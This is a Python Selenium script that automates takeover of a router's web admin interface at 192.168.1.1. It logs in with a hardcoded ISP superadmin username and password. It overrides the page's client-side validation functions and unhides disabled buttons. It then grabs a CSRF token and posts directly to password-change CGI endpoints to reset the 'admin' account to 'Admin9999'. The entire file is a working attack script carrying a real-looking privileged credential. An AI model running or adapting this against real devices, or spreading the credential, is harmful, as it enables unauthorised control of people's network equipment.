#!/usr/bin/env python3
"""
Try to change admin password by:
1. Login as superadmin via normal login page
2. Access password change page
3. Change admin password
"""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time, json

ROUTER = "https://192.168.1.1"

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(15)
    return driver


def main():
    driver = setup_driver()
    try:
        # Login as adminpldt via normal login page (not admin.html)
        print("Step 1: Login as adminpldt via /login.asp ...")
        driver.get(f"{ROUTER}/login.asp")
        time.sleep(3)

        user = driver.find_element(By.ID, "txt_Username")
        pw = driver.find_element(By.ID, "txt_Password")
        driver.execute_script("arguments[0].value='';", user)
        driver.execute_script("arguments[0].value='';", pw)
        user.send_keys("adminpldt")
        pw.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")

        driver.execute_script("window.CheckPassword = function() { return 0; }; window.setDisable = function() {};")
        driver.execute_script("document.getElementById('button').style.display='';")
        driver.find_element(By.ID, "button").click()
        time.sleep(4)

        url = driver.current_url
        print(f"After login URL: {url}")
        print(f"Page size: {len(driver.page_source)} chars")

        # Check if we got in
        has_login = "txt_Username" in driver.page_source
        if has_login:
            print("Login via normal page failed. Trying via AJAX cookie injection...")

            # Try setting cookie manually and accessing pages
            driver.get(f"{ROUTER}/admin.html")
            time.sleep(3)

            # Login via admin.html
            user2 = driver.find_element(By.ID, "txt_Username")
            pw2 = driver.find_element(By.ID, "txt_Password")
            driver.execute_script("arguments[0].value='';", user2)
            driver.execute_script("arguments[0].value='';", pw2)
            user2.send_keys("adminpldt")
            pw2.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")
            driver.execute_script("window.setDisable = function() {}; document.getElementById('button').style.display = '';")
            driver.find_element(By.ID, "button").click()
            time.sleep(5)

            url2 = driver.current_url
            if "login" in url2.lower():
                print(f"admin.html login also failed: {url2}")
                return

            print(f"admin.html login OK: {url2}")

            # Now try submitting password change via the CORRECT CGI for superadmin
            print("\nStep 2: Try MdfPwdAdminNoLg.cgi (change superadmin password first to test)...")
            driver.execute_script("document.getElementById('old_password').value = 'AC2DIU7QW3ERTY6UPAS4DFG';")
            driver.execute_script("document.getElementById('new_password').value = 'AC2DIU7QW3ERTY6UPAS4DFG';")
            driver.execute_script("document.getElementById('confirm_password').value = 'AC2DIU7QW3ERTY6UPAS4DFG';")

            # Use the REAL SubmitUpdate function (Userlevel=2 -> MdfPwdAdminNoLg.cgi)
            driver.execute_script("""
                window.CheckParameter = function() { return true; };
            """)
            driver.find_element(By.ID, "button_update").click()
            time.sleep(5)

            url3 = driver.current_url
            src3 = driver.page_source
            print(f"After superadmin update URL: {url3}")
            print(f"Page: {src3[:300]}")

            # Now try the admin password change form
            print("\nStep 3: Now try to change admin password via admin.html form...")
            driver.get(f"{ROUTER}/admin.html")
            time.sleep(3)

            # Login again if needed
            if "txt_Username" in driver.page_source:
                user3 = driver.find_element(By.ID, "txt_Username")
                pw3 = driver.find_element(By.ID, "txt_Password")
                driver.execute_script("arguments[0].value='';", user3)
                driver.execute_script("arguments[0].value='';", pw3)
                user3.send_keys("adminpldt")
                pw3.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")
                driver.execute_script("window.setDisable = function() {}; document.getElementById('button').style.display = '';")
                driver.find_element(By.ID, "button").click()
                time.sleep(5)

            # Check Userlevel
            level = driver.execute_script("return window.Userlevel;")
            print(f"Userlevel: {level}")

            # Get CSRF token
            csrf = driver.execute_script("""
                var result = null;
                $.ajax({
                    type: 'POST', async: false, cache: false,
                    url: '/asp/GetRandCount.asp',
                    success: function(data) { result = data; }
                });
                return result;
            """)
            print(f"CSRF: {csrf[:20] if csrf else 'None'}...")

            # Try submitting via raw AJAX to MdfPwdNormalNoLg.cgi with superadmin session
            result = driver.execute_script("""
                var result = null;
                var Form = new webSubmitForm();
                Form.addParameter('x.UserName', 'admin');
                Form.addParameter('z.Password', 'Admin9999');
                Form.addParameter('z.PasswordConfirm', 'Admin9999');
                $.ajax({
                    type: 'POST', async: false, cache: false,
                    url: '/asp/GetRandCount.asp',
                    success: function(data) {
                        Form.addParameter('x.X_HW_Token', data);
                    }
                });
                Form.setAction('MdfPwdNormalNoLg.cgi');
                // Don't submit form, just capture what would be sent
                var params = {};
                for (var i = 0; i < Form.oForm.elements.length; i++) {
                    params[Form.oForm.elements[i].name] = Form.oForm.elements[i].value;
                }
                return params;
            """)
            print(f"Form params would be: {json.dumps(result, indent=2)}")

            # Actually try the XHR request directly
            result2 = driver.execute_script("""
                var result = null;
                var params = 'x.UserName=admin&z.Password=Admin9999&z.PasswordConfirm=Admin9999';
                $.ajax({
                    type: 'POST', async: false, cache: false,
                    url: '/asp/GetRandCount.asp',
                    success: function(data) {
                        params += '&x.X_HW_Token=' + data;
                    }
                });
                $.ajax({
                    type: 'POST', async: false, cache: false,
                    url: 'MdfPwdNormalNoLg.cgi',
                    data: params,
                    success: function(data) { result = data; },
                    error: function(xhr, status, err) { result = 'ERROR:' + status + ':' + err + ':' + xhr.responseText; }
                });
                return result;
            """)
            print(f"MdfPwdNormalNoLg.cgi result: {str(result2)[:500]}")

            # Also try MdfPwdAdminNoLg.cgi
            result3 = driver.execute_script("""
                var result = null;
                var params = 'x.UserName=adminpldt&z.Password=AC2DIU7QW3ERTY6UPAS4DFG&z.PasswordConfirm=AC2DIU7QW3ERTY6UPAS4DFG';
                $.ajax({
                    type: 'POST', async: false, cache: false,
                    url: '/asp/GetRandCount.asp',
                    success: function(data) {
                        params += '&x.X_HW_Token=' + data;
                    }
                });
                $.ajax({
                    type: 'POST', async: false, cache: false,
                    url: 'MdfPwdAdminNoLg.cgi',
                    data: params,
                    success: function(data) { result = data; },
                    error: function(xhr, status, err) { result = 'ERROR:' + status + ':' + err + ':' + xhr.responseText; }
                });
                return result;
            """)
            print(f"MdfPwdAdminNoLg.cgi result: {str(result3)[:500]}")

            # Verify admin password
            print("\nStep 4: Verify admin:Admin9999...")
            url4, has_login4 = (None, True)
            driver.get(f"{ROUTER}/login.asp")
            time.sleep(3)
            try:
                u4 = driver.find_element(By.ID, "txt_Username")
                p4 = driver.find_element(By.ID, "txt_Password")
                driver.execute_script("arguments[0].value='';", u4)
                driver.execute_script("arguments[0].value='';", p4)
                u4.send_keys("admin")
                p4.send_keys("Admin9999")
                driver.execute_script("window.CheckPassword = function() { return 0; }; window.setDisable = function() {};")
                driver.execute_script("document.getElementById('button').style.display='';")
                driver.find_element(By.ID, "button").click()
                time.sleep(4)
                url4 = driver.current_url
                has_login4 = "txt_Username" in driver.page_source
            except:
                pass

            print(f"admin:Admin9999 -> URL: {url4}, login form: {has_login4}")

            if not has_login4:
                driver.get(f"{ROUTER}/html/amp/wlanbasic/WlanBasic.asp?2G")
                time.sleep(3)
                protected = "txt_Username" not in driver.page_source
                print(f"  Protected page accessible: {protected}")

    finally:
        driver.quit()


if __name__ == "__main__":
    main()
